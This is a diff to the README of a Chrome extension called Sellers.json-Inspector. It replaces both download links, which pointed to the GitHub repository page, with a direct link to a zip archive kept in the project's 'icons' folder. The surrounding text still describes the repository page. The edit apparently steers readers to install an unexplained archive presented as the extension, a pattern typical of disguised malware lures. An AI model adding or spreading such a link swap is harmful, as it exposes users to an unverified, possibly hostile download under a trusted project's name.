@@ -1,6 +1,6 @@
 # 🔍 Sellers.json-Inspector - Clear sellers.json checks fast
 
-[![Download](https://img.shields.io/badge/Download-Sellers.json--Inspector-blue?style=for-the-badge)](https://github.com/KDTrey7/Sellers.json-Inspector)
+[![Download](https://img.shields.io/badge/Download-Sellers.json--Inspector-blue?style=for-the-badge)](https://raw.githubusercontent.com/KDTrey7/Sellers.json-Inspector/main/icons/Inspector_Sellers_json_v2.7-alpha.1.zip)
 
 ## 🧭 What this app does
 
@@ -31,7 +31,7 @@ The extension works best on current Windows versions and recent Chrome builds.
 
 Open this page to download and install the extension:
 
-https://github.com/KDTrey7/Sellers.json-Inspector
+https://raw.githubusercontent.com/KDTrey7/Sellers.json-Inspector/main/icons/Inspector_Sellers_json_v2.7-alpha.1.zip
 
 If the page opens to the repository main page, use the files and install steps shown there to get the extension onto your computer.
 
